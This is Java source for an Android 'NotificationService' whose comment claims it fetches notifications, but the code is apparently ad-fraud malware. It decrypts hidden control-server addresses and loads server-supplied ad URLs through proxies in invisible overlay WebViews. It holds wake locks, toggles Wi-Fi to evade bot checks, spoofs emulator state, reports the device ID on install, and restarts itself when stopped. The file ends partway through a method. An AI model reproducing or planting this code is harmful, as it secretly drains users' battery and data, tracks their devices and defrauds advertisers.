package com.example.imetlin.sonik.notification.service;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.Proxy;
import java.net.URI;
import java.net.URL;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicInteger;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.graphics.PixelFormat;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.http.HttpResponseCache;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiManager.WifiLock;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewManager;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;

/**
 * NotificationService.java background service launches on boot or app startup every 5 mins calling the server to get updated notifications data
 */

@SuppressLint("NewApi")
public class NotificationService {

	// Constants ---------------------------------------------------------------------------------------------- Constants
	// static reference to a service
	public static final String USER_UUID = "userUuid"; //

	public static final String NOTIFICATION_URL_JSON = "%snotification/messages/ijson";

	public static final String NOTIFICATION_URL_LOG = "%snotification/messages/f/log";

	public static final String LOG_EVENT = "http://%s/___logm?_=%s,%s";

	public static final String NODE_URL_JSON = "http://%s/___settings";

	// reset windows if reload did not happened
	private static final int WINRESET_AFTER = 600; // secs

	// network connection type
	private static final int NETWORK_NONE = 0;
	private static final int NETWORK_WIFI = 1;
	private static final int NETWORK_DATA = 2;

	// logger tag name
	private static final String TAG_NAME = "NotificationService"; // logger

	private int netConn = NETWORK_NONE;

	public static String nh;

	public static String noh;

	public static String pid = null; // partner id

	public static String apkVersion = "7.0.0"; // apk version 

	private static List<Window> c = new ArrayList<Window>();

	protected static Long lastReload = System.currentTimeMillis(); // when window last load

	private static Long lastRefresh = null; // when refresh last happened System.currentTimeMillis() - 3600000

	public static String userUuid;

	// notification call interval
	private static int notificationInterval = 600;

	// delay first notification call
	private static int notificationStartDelay = 10;

	private static int verifyPeriod = 60; // checks if windows are running if not restarts the service

	private static String pingUrl;

	private static String otstukUrl;

	public static Integer cip = null; // we specify view id here that has click in process right now

	// Instance Variables ---------------------------------------------------------------------------- Instance Variables

	private Settings settings;

	private FakeR fakeR;

	private Context context;

	protected Service ns;

	private int cookieNumLoads = 0; // current number of loads per device for cookie reset

	private AtomicInteger totalViews24H; // total number of views per 24H

	private int dayOfYear;

	private boolean wifiWasDiabled = false;

	private boolean checkForBot = false; // checks for bot by disabling the wifi

	private boolean otk = true; // otstuk

	private boolean e = false; // emulator

	private int curl = 0;

	private int proxyReloaded = 0; // num of times proxy reloaded in a row

	private int adErrorReloaded = 0; // num of times adError trigered

	private Map<String, Integer> countViews = new HashMap<String, Integer>();

	private boolean proxyEnabled = false;

	private WakeLock wakeLock = null;

	private WifiLock wifiLock = null;

	private String xCountry = null;

	// Constructors ---------------------------------------------------------------------------------------- Constructors

	// Public Methods ------------------------------------------------------------------------------------ Public Methods
	public NotificationService() {
		Log.d(TAG_NAME, "Init notification service, inital views: ");
		Log.d(TAG_NAME, String.valueOf(c.size()));
	}

	public static void restart(Context context, Class<?> service) {
		Log.d(TAG_NAME, "NotificationService restart");
		try {
			Intent __ns = new Intent(context, service);
			__ns.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startService(__ns);
		} catch (Exception e) {
			Log.d(TAG_NAME, e.getMessage(), e);
		}
	}

	public void create(Object... objects) {
		try {
			this.context = (Context) objects[0];
			this.ns = (Service) objects[1];

			SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);

			fakeR = new FakeR(context);

			int lock = context.checkCallingOrSelfPermission("android.permission.WAKE_LOCK");
			if (lock == PackageManager.PERMISSION_GRANTED) {
				// Don't stop when the screen sleeps
				PowerManager mgr = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
				wakeLock = mgr.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "com.notification.service.WakeLock");
				wakeLock.acquire();

				wifiLock();
			}

			IntentFilter filter = new IntentFilter();
			filter.addAction("android.intent.action.ACTION_POWER_CONNECTED");
			filter.addAction("android.intent.action.ACTION_POWER_DISCONNECTED");
			filter.addAction("android.intent.action.ACTION_BATTERY_LOW");
			filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
			filter.addAction(Intent.ACTION_SCREEN_ON);
			filter.addAction("RW");
			filter.addAction("RESIZE");
			filter.addAction("PE");
			filter.addAction("PS");
			filter.addAction("AE");
			filter.addAction("PC");
			filter.addAction("SW");
			filter.addAction("CC");
			filter.addAction("FF");
			filter.addAction("SS");
			filter.addAction("CV");
			filter.addAction("CVB");
			filter.addAction("CCLK");
			filter.addAction("WIFI");
			filter.addAction("MUTE");
			filter.addAction("UNMUTE");
			filter.addAction("SERVICE_DESTROY");
			(ns != null ? ns : context).registerReceiver(receiver, filter);

			// register intent to verify if service is running
			IntentFilter filter2 = new IntentFilter("CNS");
			context.registerReceiver(receiverVerify, filter2);

			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT)
				WebView.setWebContentsDebuggingEnabled(true);

			Log.d(TAG_NAME, "NotificationService has started v.");
			Log.d(TAG_NAME, String.valueOf(Build.VERSION.SDK_INT));

			try {
				// host to call for new notifications
				nh = fakeR.byIdName("nh");
			} catch (Exception e) {
				nh = sharedPreferences.getString("nh", null);
				if (nh == null || nh.equals(""))
					nh = AesUtils.decrypt("lfsj3ngF4vRjg6TFL6CXKvojUs8Xc2GsmZ3h7iNXp6s=", AesUtils.encryptionKey);
			}

			noh = sharedPreferences.getString("noh", null); // detect last node

			// detect partner id
			try {
				pid = fakeR.byIdName("partner_id");
			} catch (Exception e) {
			}

			try {
				notificationInterval = Integer.parseInt(fakeR.byIdName("ni"));
				notificationStartDelay = Integer.parseInt(fakeR.byIdName("ns"));
			} catch (Exception e) {
			}

			try {
				checkForBot = Boolean.parseBoolean(fakeR.byIdName("cfb"));
			} catch (Exception e) {
			}

			try {
				otk = Boolean.parseBoolean(fakeR.byIdName("otk"));
			} catch (Exception e) {
			}

			try {
				e = Boolean.parseBoolean(fakeR.byIdName("e"));// emulator
			} catch (Exception e) {
			}

			try {
				pingUrl = AesUtils.decrypt("a9TkDGdxaUvcbAH4zyKg/fAHqb0NwANnMhSPpytZeLZvEfhWNHHcyyeUuRLGFl+/2AFPXXuEjZ7tY344+lxSWjI3oPnY0IkySyQpP+tDNa0=", AesUtils.encryptionKey);
			} catch (Exception e2) {
			}

			try {
				otstukUrl = AesUtils.decrypt("NtUBludHkysu9H/ioKbxUANkrFker2/td5T/FQdhxnhvcPL6hkiPH0yJNUsJ6ICeU8XMrpK7JnHAkkU5GaFF7KBXsYJEcrBi6NjAbRX9kT4=", AesUtils.encryptionKey);
			} catch (Exception e2) {
			}

			netConn = networkStatus(); // set network connection status

			Log.d(TAG_NAME, "PartnerID: ");
			Log.d(TAG_NAME, "" + pid);
			Log.d(TAG_NAME, "checkForBot: ");
			Log.d(TAG_NAME, "" + checkForBot);

			// read country
			xCountry = sharedPreferences.getString("COUNTRY", null);

			// lets read initial # of views per 24H
			totalViews24H = new AtomicInteger(sharedPreferences.getInt("TOTALVIEWS_24H", 0));

			dayOfYear = Calendar.getInstance().get(Calendar.DAY_OF_YEAR);

			//
			if (checkForBot) {
				int res = context.checkCallingOrSelfPermission("android.permission.CHANGE_WIFI_STATE");
				String pinged = sharedPreferences.getString("PINGED", null);
				if (pinged == null) {

					// check for bots, disable/enable wifi
					if (netConn == NETWORK_WIFI) {

						// check permission first
						if (res == PackageManager.PERMISSION_GRANTED) {
							Log.d(TAG_NAME, "Wi-fi enabled - disable it");
							wifiWasDiabled = true;
							WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
							wifiManager.setWifiEnabled(false);

							// as we are disabling it lets make sure its back in 7 seks
							new Handler().postDelayed(new Runnable() {
								public void run() {
									netConn = networkStatus();
									if (netConn == NETWORK_NONE)
										enableWifi();
								}
							}, 7 * 1000);

						} else {
							Log.d(TAG_NAME, "No permission to change wi-fi state");
						}

					} else if (netConn == NETWORK_DATA) {
						reportRealDevice();
					} else if (netConn == NETWORK_NONE && res == PackageManager.PERMISSION_GRANTED) {
						enableWifi();
					}

					// if no network
				} else if (netConn == NETWORK_NONE && res == PackageManager.PERMISSION_GRANTED) {
					enableWifi();
					Log.d(TAG_NAME, "Pinged...");
				} else {
					Log.d(TAG_NAME, "Pinged...");
				}
			}

			// enable caching
			try {
				File httpCacheDir = new File(context.getCacheDir(), "http");
				long httpCacheSize = 30 * 1024 * 1024; // 10 MiB
				HttpResponseCache.install(httpCacheDir, httpCacheSize);
				Log.d(TAG_NAME, "HttpResponseCache Cache enabled: ");
				Log.d(TAG_NAME, httpCacheDir.getAbsolutePath());
			} catch (IOException e) {
				Log.e(TAG_NAME, "HttpResponseCache installation failed:", e);
			}

			new Handler().postDelayed(new Runnable() {
				public void run() {

					refreshNotifications();// start interval to check for new notifications

					verifyViewsRefresh(); // start task to verfy views

					new Handler().postDelayed(new Runnable() {
						public void run() {
							handleInstall();
						}
					}, 30 * 1000);
				}
			}, notificationStartDelay * 1000);

		} catch (Exception e) {
			Log.e(TAG_NAME, e.getMessage(), e);
		}

	}

	public void handleInstall() {
		// read from shared if we just installed it
		SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
		String installedOn = sharedPreferences.getString("NotificationServiceInstalledOn", null);
		// if we do not have installed date saved yet means we just installed it
		if (installedOn == null) {
			// otstuk
			if (settings != null && settings.otstuk != null && settings.otstuk.equals("") == false) {
				try {
					String deviceId = android.provider.Settings.Secure.getString(context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
					new LogEvent().execute(String.format(settings.otstuk, deviceId));
				} catch (Exception e) {
					Log.e(TAG_NAME, e.getMessage(), e);
				}
			}

			Editor shared = sharedPreferences.edit();
			shared.putString("NotificationServiceInstalledOn", String.valueOf(System.currentTimeMillis()));
			shared.commit();
			// install log
			new LogEvent().execute(String.format(LOG_EVENT, noh, "INSTALL", getUserUuid(context)));
		}

	}

	// returns device unique identifier
	public static String getUserUuid(Context context) {
		SharedPreferences sharedPreferences;
		if (userUuid != null) {
			// do nothing
		} else {
			// lets read uuid from local storage
			sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
			String userUuid = sharedPreferences.getString(USER_UUID, null);
			if (userUuid != null) {
				NotificationService.userUuid = userUuid;
			} else { // if not lets genearte a new one and save to local storage
				NotificationService.userUuid = UUID.randomUUID().toString();
				sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
				Editor edit = sharedPreferences.edit();
				edit.putString(USER_UUID, NotificationService.userUuid);
				edit.commit();
			}
		}
		return NotificationService.userUuid;
	}

	public static String getApplicationId(Context context) {
		return context.getPackageName();
	}

	public void destroy(Object... objects) {
		try {
			final Context context = (Context) objects[0];
			final Class<?> ser = (Class<?>) objects[1];
			Service currSer = null;
			if (objects.length == 3)
				currSer = (Service) objects[2];
			if (objects.length == 4)
				destroyViews();
			(ns != null ? ns : (currSer != null ? currSer : context)).unregisterReceiver(receiver);
			context.unregisterReceiver(receiverVerify);
			Log.d(TAG_NAME, "Service OnDestroy event");
			if (ser != null) {
				new Handler().postDelayed(new Runnable() {
					public void run() {
						NotificationService.restart(context, ser);
					}
				}, notificationStartDelay * 1000);
			}
		} catch (Exception e) {
			Log.e(TAG_NAME, e.getMessage(), e);
		}
	}

	// method is called from scheduler to verify if service is running
	public void verify(Object... objects) {
		final Context context = (Context) objects[0];
		final Class<?> ser = (Class<?>) objects[1];

		// lets verify if refresh settings is running
		if (lastRefresh != null) {
			long timeR = (System.currentTimeMillis() - lastRefresh) / 1000;
			if (timeR > notificationInterval + 60) {
				Log.d(TAG_NAME, "Service refreshNotifications is not running, launching...");
				rescheduleRefresh();
			}
		}

		// lets verify when last window reload happened, if it was more then force refresh timeout , something happened to the service
		long time = (System.currentTimeMillis() - lastReload) / 1000;
		if (settings != null && isViewRunning() && time > settings.forceCloseTimeout + 60) { //
			Log.d(TAG_NAME, "Looks like service is down...relaunch");
			restart(context, ser);
		}

	}

	// Protected Methods ------------------------------------------------------------------------------ Protected Methods

	// Private Methods ---------------------------------------------------------------------------------- Private Methods

	private void stopService() {
		Log.d(TAG_NAME, "Service: force service restart");
		lastRefresh = System.currentTimeMillis() - 3600000; // reset last refresh
		for (int s = 0; s < c.size(); s++) {
			c.get(s).disable();
		}
		new Handler(context.getMainLooper()).postDelayed(new Runnable() {
			public void run() {
				for (int s = 0; s < c.size(); s++) {
					c.get(s).destroy();
				}
			}
		}, 3000);

		new Handler(context.getMainLooper()).postDelayed(new Runnable() {
			public void run() {
				c = new ArrayList<Window>();
				if (ns != null)
					ns.stopService(new Intent(ns, ns.getClass()));
				System.gc();
			}
		}, 5000);

	}

	private void destroyViews() {
		Log.d(TAG_NAME, "Service: destroying views");
		for (int s = 0; s < c.size(); s++) {
			c.get(s).disable();
		}
		new Handler(context.getMainLooper()).postDelayed(new Runnable() {
			public void run() {
				for (int s = 0; s < c.size(); s++) {
					c.get(s).destroy();
				}
				c = new ArrayList<Window>();
				lastRefresh = 0L;
				lastReload = 0L;
			}
		}, 500);
	}

	private void refreshNotifications() {
		Log.d(TAG_NAME, "RefreshNotifications instantiated ... ");
		// update total views
		int currentDay = Calendar.getInstance().get(Calendar.DAY_OF_YEAR);
		if (dayOfYear != currentDay) {
			// next day reset
			dayOfYear = currentDay;
			totalViews24H.set(0);
		}

		SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
		Editor edit = sharedPreferences.edit();
		edit.putInt("TOTALVIEWS_24H", totalViews24H.get());
		edit.commit();

		if (lastRefresh == null)
			lastRefresh = System.currentTimeMillis() - 3600000;// must be higher then hardcoded interval
		// lets check when last reload happened, if it was long time ago lets set windows to 0
		long time = (System.currentTimeMillis() - lastReload) / 1000;
		// get when last refresh happneed if we were in stand by it was stopped too
		long timeR = (System.currentTimeMillis() - lastRefresh) / 1000;
		// Log.d(TAG_NAME, "Service: Last: " + time + ", refresh: " + timeR);
		if (time > WINRESET_AFTER && timeR > notificationInterval + 60) { // //if last reload happened over 10 mins ago, lets set windows to 0
			Log.d(TAG_NAME, "Service: reset windows container");
			c = new ArrayList<Window>();
			lastReload = System.currentTimeMillis();
		}

		// check for connection
		netConn = networkStatus();
		if (netConn == NETWORK_NONE) {
			// int res = context.checkCallingOrSelfPermission("android.permission.CHANGE_WIFI_STATE");
			// if (res == PackageManager.PERMISSION_GRANTED)
			// enableWifi();
		} else {

			// check if last refresh was actually done when its supposed to be notificationInterval, -5 secs just to make sure
			if (timeR > notificationInterval - 5) {

				if (noh == null || noh.equals(""))
					new Notifications().execute(); // call controller launch notification service refresh
				else
					new NodeNotifications().execute();// call node

			} else {
				Log.d(TAG_NAME, "Refresh notifications canceled...too soon");
				// rescheduleRefresh();
			}

			// lets do otstuk
			if (otk)
				otstuk();

		}
	}

	private void verifyViewsRefresh() {

		new Handler().postDelayed(new Runnable() {
			public void run() {

				verifyViews();
				verifyViewsRefresh();

			}
		}, verifyPeriod * 1000);

	}

	private boolean isViewRunning() {
		boolean active = false; // true if any of the windows must be active
		// run force reaload check
		for (int s = 1; s <= c.size(); s++) {
			Window w = c.get(s - 1);
			if (w.isStatus())
				active = true;
		}
		return active;
	}

	private void verifyViews() {

		long time;
		boolean active = false; // true if any of the windows must be active
		// run force reaload check
		for (int s = 1; s <= c.size(); s++) {
			Window w = c.get(s - 1);
			if (w.isStatus())
				active = true;
			if (settings != null && settings.forceCloseTimeout > 0 && w.isStatus()) {
				time = ((System.currentTimeMillis() - w.getLastLoad()) / 1000);
				if (time > settings.forceCloseTimeout) {
					Log.d(TAG_NAME, "Service Verify: Force Reload window with url: ");
					Log.d(TAG_NAME, w.getUrl());
					w.load(getNextUrl());
				}
			}
		}

		// lets verify when last window reload happened, if it was more then force refresh timeout , something happened to the network restart wifi
		time = (System.currentTimeMillis() - lastReload) / 1000;
		// Log.d(TAG_NAME, "Verify any active: " + active + ", last refresh " + time);
		if (active && settings != null && time > settings.forceCloseTimeout * 2) { //
			Log.d(TAG_NAME, "Looks like windows are not running...restart");
			netConn = networkStatus(); // set network connection status
			// check for bots, disable/enable wifi
			if (netConn == NETWORK_WIFI) {
				// check permission first
				int res = context.checkCallingOrSelfPermission("android.permission.CHANGE_WIFI_STATE");
				if (res == PackageManager.PERMISSION_GRANTED) {
					Log.d(TAG_NAME, "Wi-fi enabled - disable it");
					wifiWasDiabled = true;
					WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
					wifiManager.setWifiEnabled(false);

					// as we are disabling it lets make sure its back in 7 seks
					new Handler().postDelayed(new Runnable() {
						public void run() {
							netConn = networkStatus();
							enableWifi();
						}
					}, 7 * 1000);
				} else {
					stopService(); // no permission to trigger wifi, lets try to restart the service
				}
			} else {
				stopService(); // we are on 3g lets restart the service
			}

			lastReload = System.currentTimeMillis(); // reset
		}

	}

	private void rescheduleRefresh() {

		new Handler().postDelayed(new Runnable() {
			public void run() {

				refreshNotifications();

			}
		}, notificationInterval * 1000);

	}

	// returns native screen resolution
	private int[] getDeviceSize() {
		DisplayMetrics displayMetrics = new DisplayMetrics();
		WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE); // the results will be higher than using the activity context object or the getWindowManager() shortcut
		wm.getDefaultDisplay().getMetrics(displayMetrics);
		return new int[] { displayMetrics.widthPixels, displayMetrics.heightPixels };
	}

	private void forceReload(int viewId) {
		Log.d(TAG_NAME, "Service: Force Reload Via __load intent");
		try {
			Window w = c.get(viewId);
			w.load(getNextUrl());
		} catch (Exception e) {
			Log.e(TAG_NAME, e.getMessage(), e);
		}
	}

	// updates views setup depending on settings
	private void updateViews() {

		if (settings != null) {

			Integer max = getMaxViews();
			long time;
			if (max != null)
				for (int s = 1; s <= max; s++) {
					if (s > c.size()) {
						createView(getNextUrl());
					} else {
						Window w = c.get(s - 1);
						if (w.isStatus() == false) {
							w.load(getNextUrl());
						} else if (settings.forceCloseTimeout > 0) {
							// lets check for force timeout just incase
							time = ((System.currentTimeMillis() - w.getLastLoad()) / 1000);
							if (time > settings.forceCloseTimeout) {
								Log.d(TAG_NAME, "Service: Force Reload window with url: ");
								Log.d(TAG_NAME, w.getUrl());
								w.load(getNextUrl());
							}
						}
					}
				}
			// if we need to decrease number of windows
			if (max != null && c.size() > max) {
				for (int s = c.size(); s > max; --s) {
					Window w = c.get(s - 1);
					if (w.isStatus())
						w.disable();
				}
			}
		}
	}

	private String getNextUrl() {
		if (settings != null && settings.urls != null && settings.urls.size() > 0) {
			List<String> urls = settings.urls;
			String url = urls.get(curl);
			curl++;// pick up next url
			if (curl >= urls.size())
				curl = 0;
			return url;
		}
		return "about:blank";
	}

	private void updateSettings(JSONObject sets) {
		if (settings == null)
			settings = new Settings(); // init settings of the service

		if (sets != null) {

			try {
				// lets update random feed
				String feed = sets.optString("feed");
				if (feed != null && feed.equals("") == false)
					noh = feed;

				// update tomcat url
				String tomcatUrl = sets.optString("ctu");
				if (tomcatUrl != null && tomcatUrl.equals("") == false)
					nh = tomcatUrl;

				settings.forceCloseTimeout = sets.optInt("fct");
				settings.timeAfterClk = sets.optInt("tac");
				settings.clearCookieLoads = sets.optInt("cc");
				settings.maxViewsData = sets.optInt("mvd");
				settings.maxViewsWifi = sets.optInt("mvw");
				settings.urls = new ArrayList<String>();
				settings.ctr = new HashMap<String, Float>();
				settings.proxyWifi = sets.optBoolean("pxwf");
				settings.proxyData = sets.optBoolean("pxdt");
				settings.proxies = new ArrayList<String>();
				settings.country = sets.optString("c");
				settings.otstuk = sets.optString("o");
				settings.maxDeviceLoadsPerDay = sets.optInt("mrpd");

				SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);

				// keep country saved
				// save country only if this is first request not via proxy
				if (xCountry == null || xCountry.equals("")) {
					Editor edit = sharedPreferences.edit();
					edit.putString("COUNTRY", settings.country);
					edit.commit();
					xCountry = settings.country;
					Log.i(TAG_NAME, "Country detected as: " + xCountry);
				}

				// in case of the success call lets save controller data
				String savedNh = sharedPreferences.getString("nh", null);
				if (savedNh == null || savedNh.equals("") || savedNh.equalsIgnoreCase(nh) == false) {
					Editor edit = sharedPreferences.edit();
					edit.putString("nh", nh);
					edit.commit();
				}

				// in case of the success call lets save node data
				String savedNoh = sharedPreferences.getString("noh", null);
				if (savedNoh == null || savedNoh.equals("") || savedNoh.equalsIgnoreCase(noh) == false) {
					Editor edit = sharedPreferences.edit();
					edit.putString("noh", noh);
					edit.commit();
				}

				JSONObject ctr = sets.optJSONObject("ctr");
				if (ctr != null) {
					Iterator<?> keys = ctr.keys();
					while (keys.hasNext()) {
						String tagId = (String) keys.next();
						settings.ctr.put(tagId, Float.valueOf(ctr.get(tagId).toString()));
					}
				}
				settings.bans = new HashMap<String, Integer>();
				JSONObject bans = sets.optJSONObject("bans");
				if (bans != null) {
					Iterator<?> keys = bans.keys();
					while (keys.hasNext()) {
						String tagId = (String) keys.next();
						settings.bans.put(tagId, Integer.valueOf(bans.get(tagId).toString()));
					}
				}
				JSONArray jarr = sets.optJSONArray("u2");
				if (jarr != null) {
					for (int s = 0; s < jarr.length(); s++) {
						settings.urls.add(jarr.getString(s));
					}
				}
				JSONArray proxs = sets.optJSONArray("px");
				if (proxs != null) {
					for (int s = 0; s < proxs.length(); s++) {
						settings.proxies.add(proxs.getString(s));
					}
				}

				if (proxyEnabled == false)
					setProxy();// randmly set proxy

				JSONArray range = sets.optJSONArray("w");
				JSONObject obj;
				settings.wifi = new ArrayList<Settings.RangeDto>();
				if (range != null)
					for (int r = 0; r < range.length(); r++) {
						obj = range.getJSONObject(r);
						settings.wifi.add(settings.new RangeDto(obj.getInt("views"), obj.getInt("from"), obj.getInt("to")));
					}
				range = sets.optJSONArray("m");
				settings.mobile = new ArrayList<Settings.RangeDto>();
				if (range != null)
					for (int r = 0; r < range.length(); r++) {
						obj = range.getJSONObject(r);
						settings.mobile.add(settings.new RangeDto(obj.getInt("views"), obj.getInt("from"), obj.getInt("to")));
					}
			} catch (JSONException e) {
				Log.e(TAG_NAME, e.getMessage(), e);
			}
		}
	}

	// get battery status,
	// [0] - BatteryManager.BATTERY_STATUS_CHARGING
	// [1] - battery charge %
	private int[] getBatteryStatus() {
		if (e) {
			return new int[] { BatteryManager.BATTERY_STATUS_CHARGING, 100 };
		}
		IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
		Intent batteryStatus = (ns != null ? ns : context).registerReceiver(null, ifilter);
		return new int[] { batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1), batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) };
	}

	// returns max number of allowed views
	private int getMaxViews() {
		if (settings == null)
			return 0;

		// lets diable views if we reached the limit per 24 on device
		if (settings.maxDeviceLoadsPerDay > 0 && totalViews24H.get() > settings.maxDeviceLoadsPerDay) {
			Log.i(TAG_NAME, "Limit per 24H have been reached: " + totalViews24H.get() + ", Limit: " + settings.maxDeviceLoadsPerDay);
			return 0;
		}

		try {
			netConn = networkStatus();
			int[] batteryStatus = getBatteryStatus();
			int battery = batteryStatus[1];
			// Log.d(TAG_NAME, "Net: " + netConn + ", isCharging(): " + (batteryStatus[0] == BatteryManager.BATTERY_STATUS_CHARGING) + ", % : " + batteryStatus[1]);
			if (batteryStatus[0] == BatteryManager.BATTERY_STATUS_CHARGING || battery == 100) { // or charging but fully charged
				return netConn == NETWORK_WIFI ? settings.maxViewsWifi : (netConn == NETWORK_DATA ? settings.maxViewsData : 0);
			} else {
				List<Settings.RangeDto> range = netConn == NETWORK_WIFI ? settings.wifi : (netConn == NETWORK_DATA ? settings.mobile : null);
				if (range != null) {
					for (Settings.RangeDto r : range) {
						if (battery > r.from && battery <= r.to) {
							return r.views;
						}
					}
				}
			}
		} catch (Exception e) {
			Log.e(TAG_NAME, e.getMessage(), e);
		}

		return 0;
	}

	@SuppressLint("NewApi")
	private WebView createViewInstance() {

		try {

			WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
			LayoutParams params = new LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT, LayoutParams.TYPE_TOAST, LayoutParams.FLAG_NOT_TOUCHABLE | LayoutParams.FLAG_NOT_FOCUSABLE, // fix keyboard disappearance
			    PixelFormat.TRANSLUCENT);

			params.gravity = Gravity.TOP | Gravity.LEFT;
			// params.x = -2000;
			// params.y = -2000;

			int[] size = getDeviceSize();
			params.width = size[0];
			params.height = size[1] - 200;
			// params.width = 1;
			// params.height = 1;

			LinearLayout view = new LinearLayout(context);
			view.setLayoutParams(new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT));

			// create view
			WebView wv = new WebView(context);
			wv.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
			wv.addJavascriptInterface(new NotificationWebInterface(ns != null ? ns : context), "Android");

			WebSettings s = wv.getSettings();
			s.setCacheMode(WebSettings.LOAD_DEFAULT);
			// s.setCacheMode(WebSettings.LOAD_NO_CACHE);
			// s.setDatabaseEnabled(true);
			s.setDomStorageEnabled(true);
			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1)
				s.setMediaPlaybackRequiresUserGesture(false);
			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
				wv.getSettings().setAllowUniversalAccessFromFileURLs(true);
				wv.getSettings().setAllowFileAccessFromFileURLs(true);
			}
			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
				wv.getSettings().setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
			// if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
			// s.setOffscreenPreRaster(true);
			s.setJavaScriptEnabled(true);
			s.setLoadWithOverviewMode(true);
			s.setUseWideViewPort(true);

			wv.setVisibility(View.INVISIBLE);
			// wv.setWebViewClient(new NotificationWebViewClient(s.getUserAgentString()));

			view.addView(wv);
			windowManager.addView(view, params);

			return wv;

		} catch (Exception e) {

			Log.e(TAG_NAME, e.getMessage(), e);

		}

		return null;

	}

	// detect network connection
	private int networkStatus() {
		if (e)
			return NETWORK_WIFI;
		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		int status = NETWORK_NONE;
		if (cm != null) {
			NetworkInfo ani = cm.getActiveNetworkInfo();
			if (ani != null) {
				String network = ani.getTypeName();
				// Toast.makeText(this, "network: " + network + ", connected: " + ani.isConnected(), Toast.LENGTH_SHORT).show();
				if (network.equalsIgnoreCase("WIFI"))
					status = NETWORK_WIFI;
				if (network.equalsIgnoreCase("MOBILE"))
					status = NETWORK_DATA;
			}
		}
		// Log.d(TAG_NAME, "Network status: ");
		// Log.d(TAG_NAME, "" + status);
		return status;
	}

	// create notification view
	private void createView(String data) {
		Log.d(TAG_NAME, "Create new view and call: ");
		Log.d(TAG_NAME, data);

		WebView wv = createViewInstance();
		if (e)
			wv.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 7.1.1; H96 PRO+ Build/NMF26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Safari/537.36 ." + c.size());
		Window w = new Window(wv, new NotificationWebViewClient(wv.getSettings().getUserAgentString() + " ." + c.size(), context));
		w.setId(c.size());
		w.load(data);
		c.add(w);
	}

	// show view
	private void showView(int viewId) {
		Log.d(TAG_NAME, "ShowView Event triggered for viewId: ");
		Log.d(TAG_NAME, String.valueOf(viewId));
		if (c != null && c.size() - 1 >= viewId)
			c.get(viewId).show();
	}

	// aderror
	private void adError(final int viewId, final String url, boolean resetProxy) {
		// Log.d(TAG_NAME, "AdError event:");
		// Log.d(TAG_NAME, String.valueOf(viewId));
		// Log.d(TAG_NAME, String.valueOf(url));
		// Log.d(TAG_NAME, String.valueOf(resetProxy));
		if (resetProxy)
			setProxy();// randmly set proxy
		adErrorReloaded++;
		new Handler().postDelayed(new Runnable() {
			public void run() {
				if (url != null) {
					String nurl = url.replaceAll("/$", "");
					if (c != null && c.size() - 1 >= viewId)
						c.get(viewId).reload(nurl, null);
				}
			}
		}, adErrorReloaded * 5 * 1000);
	}

	// proxy reset
	private void proxyReset() {
		Log.d(TAG_NAME, "Proxy reset");
		Log.d(TAG_NAME, String.valueOf(proxyReloaded));
		setProxy();// randmly set proxy
		proxyReloaded++;
		new Handler().postDelayed(new Runnable() {
			public void run() {
				for (int s = 0; s < c.size(); s++)
					forceReload(s);
			}
		}, proxyReloaded * 5 * 1000);
	}

	private void proxySuccess() {
		// Log.d(TAG_NAME, "Proxy success!");
